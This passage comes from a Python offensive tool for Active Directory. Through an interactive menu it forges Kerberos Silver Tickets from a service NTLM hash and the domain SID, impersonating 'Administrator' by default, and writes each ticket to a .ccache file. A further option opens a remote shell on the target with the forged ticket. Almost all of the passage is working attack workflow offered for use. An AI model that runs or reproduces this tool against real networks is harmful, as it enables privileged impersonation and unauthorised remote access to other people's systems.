                    print(Fore.YELLOW + "[!] Could not auto-detect Domain SID" + Style.RESET_ALL)
                    domain_sid = get_input(
                        Fore.CYAN + "[?] Enter Domain SID manually: " + Style.RESET_ALL
                    )

                # Step 4: Ask for user to impersonate
                ticket_user = get_input(
                    Fore.CYAN   + "[?] Username to impersonate      : " + Style.RESET_ALL +
                    Fore.YELLOW + "(default: Administrator) " + Style.RESET_ALL,
                    allow_empty=True
                ) or "Administrator"

                # Step 5: Output path
                default_name = f"{ticket_user}_{service_name}_{target_computer}.ccache"
                while True:
                    print(
                        Fore.CYAN   + "[?] Ticket output path           : " +
                        Fore.YELLOW + f"( default: {default_name} ) " +
                        Style.RESET_ALL, end=''
                    )
                    out_input   = input().strip()
                    ticket_path, path_err = resolve_ticket_path(out_input, default_name)
                    if path_err:
                        print(Fore.RED + path_err + Style.RESET_ALL)
                        continue
                    break

                # Step 6: Forge the Silver Ticket
                print(Fore.YELLOW + f"[*] Ticket will be saved to: {ticket_path}" + Style.RESET_ALL)

                ccache_file = create_silver_ticket(
                    domain, service_hash, domain_sid, ticket_user,
                    service_name, target_fqdn, ticket_path
                )

                if not ccache_file or not os.path.exists(ccache_file):
                    print(Fore.RED + "[-] Silver Ticket was not created successfully!" + Style.RESET_ALL)
                    ccache_file = None
                else:
                    print(Fore.CYAN + "\n[*] Silver Ticket Info:" + Style.RESET_ALL)
                    print(Fore.CYAN + f"    Service   : {service_name}/{target_fqdn}" + Style.RESET_ALL)
                    print(Fore.CYAN + f"    User      : {ticket_user}" + Style.RESET_ALL)
                    print(Fore.CYAN + f"    Hash used : {service_hash}" + Style.RESET_ALL)
                    print(Fore.CYAN + f"    Ticket    : {ccache_file}" + Style.RESET_ALL)
                    print(Fore.YELLOW + "    -> Select option 4 to use this ticket." + Style.RESET_ALL)

            # ==========================================================
            # Option 3: Manual hash - forge Silver Ticket
            # ==========================================================
            elif choice == '3':
                # Let user pick a service
                print(Fore.CYAN + f"\n[?] Select service for Silver Ticket ({target_fqdn}):" + Style.RESET_ALL)
                for key, (svc_class, svc_desc) in SUPPORTED_SERVICES.items():
                    print(Fore.WHITE + f"    {key}. {svc_class:8s} — {svc_desc}" + Style.RESET_ALL)
                print(Fore.WHITE + "    M. Manual entry (custom SPN)" + Style.RESET_ALL)

                svc_choice = get_input(
                    Fore.CYAN + "[?] Service choice              : " + Style.RESET_ALL,
                    lambda x: x.upper() in [str(k) for k in SUPPORTED_SERVICES.keys()] + ['M'],
                    "Invalid choice! Select 1-9, 0, or M"
                )

                if svc_choice.upper() == 'M':
                    service_name = get_input(
                        Fore.CYAN + "[?] Enter service name (e.g. cifs, HTTP, MSSQLSvc): " + Style.RESET_ALL
                    )
                else:
                    service_name = SUPPORTED_SERVICES[svc_choice][0]

                print(Fore.GREEN + f"[+] Selected service: {service_name}" + Style.RESET_ALL)

                # Manual hash input
                service_hash = get_input(
                    Fore.CYAN + "[?] Enter NTLM hash (32 hex)     : " + Style.RESET_ALL,
                    validate_hash,
                    "Invalid NTLM hash! Must be 32 hex characters (e.g. aad3b435b51404eeaad3b435b51404ee)"
                )

                if not domain_sid:
                    domain_sid = get_input(
                        Fore.CYAN   + "[?] Enter Domain SID              : " + Style.RESET_ALL +
                        Fore.YELLOW + "(e.g. S-1-5-21-...) " + Style.RESET_ALL,
                        allow_empty=True
                    )
                    if not domain_sid:
                        print(Fore.YELLOW + "[*] Trying to auto-detect Domain SID via LSA..." + Style.RESET_ALL)
                        sid = get_domain_sid_via_lsa(dc_ip, domain, username, password)
                        if sid:
                            domain_sid = sid
                            print(Fore.GREEN + f"[+] Domain SID: {domain_sid}" + Style.RESET_ALL)
                        else:
                            print(Fore.RED + "[!] Could not auto-detect Domain SID!" + Style.RESET_ALL)
                            continue

                ticket_user = get_input(
                    Fore.CYAN   + "[?] Username to impersonate      : " + Style.RESET_ALL +
                    Fore.YELLOW + "(default: Administrator) " + Style.RESET_ALL,
                    allow_empty=True
                ) or "Administrator"

                default_name = f"{ticket_user}_{service_name}_{target_fqdn.split('.')[0]}.ccache"
                while True:
                    print(
                        Fore.CYAN   + "[?] Ticket output path           : " +
                        Fore.YELLOW + f"( default: {default_name} ) " +
                        Style.RESET_ALL, end=''
                    )
                    out_input   = input().strip()
                    ticket_path, path_err = resolve_ticket_path(out_input, default_name)
                    if path_err:
                        print(Fore.RED + path_err + Style.RESET_ALL)
                        continue
                    break

                print(Fore.YELLOW + f"[*] Ticket will be saved to: {ticket_path}" + Style.RESET_ALL)

                ccache_file = create_silver_ticket(
                    domain, service_hash, domain_sid, ticket_user,
                    service_name, target_fqdn, ticket_path
                )

                if not ccache_file or not os.path.exists(ccache_file):
                    print(Fore.RED + "[-] Silver Ticket was not created successfully!" + Style.RESET_ALL)
                    ccache_file = None
                else:
                    print(Fore.CYAN + "\n[*] Silver Ticket Info:" + Style.RESET_ALL)
                    print(Fore.CYAN + f"    Service   : {service_name}/{target_fqdn}" + Style.RESET_ALL)
                    print(Fore.CYAN + f"    User      : {ticket_user}" + Style.RESET_ALL)
                    print(Fore.CYAN + f"    Hash used : {service_hash}" + Style.RESET_ALL)
                    print(Fore.CYAN + f"    Ticket    : {ccache_file}" + Style.RESET_ALL)
                    print(Fore.YELLOW + "    -> Select option 4 to use this ticket." + Style.RESET_ALL)

            # ==========================================================
            # Option 4: Open shell with existing ticket
            # ==========================================================
            elif choice == '4':
                if not ccache_file or not os.path.exists(ccache_file):
                    while True:
                        inp = get_input(
                            Fore.CYAN   + "[?] Enter .ccache file path      : " + Style.RESET_ALL +
                            Fore.YELLOW + "(e.g. Administrator_cifs_DC01.ccache) " + Style.RESET_ALL
                        )
                        resolved, err = resolve_existing_ccache(inp)
                        if err:
                            print(Fore.RED + err + Style.RESET_ALL)
                            retry = get_input(
                                Fore.CYAN + "[?] Try again? (y/n): " + Style.RESET_ALL,
                                lambda x: x.lower() in ['y', 'n'],
                                "Enter y or n"
                            )
                            if retry.lower() == 'n':
                                break
                            continue
                        ccache_file = resolved
                        print(Fore.GREEN + f"[+] Ticket loaded: {ccache_file}" + Style.RESET_ALL)
                        break

                    if not ccache_file:
                        continue

                if not ticket_user:
                    ticket_user = get_input(
                        Fore.CYAN   + "[?] Username in ticket           : " + Style.RESET_ALL +
                        Fore.YELLOW + "(default: Administrator) " + Style.RESET_ALL,
                        allow_empty=True
                    ) or "Administrator"

                shell = RemoteShell(dc_ip, domain, ticket_user, ccache_file, target_fqdn)
                shell.run()

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)
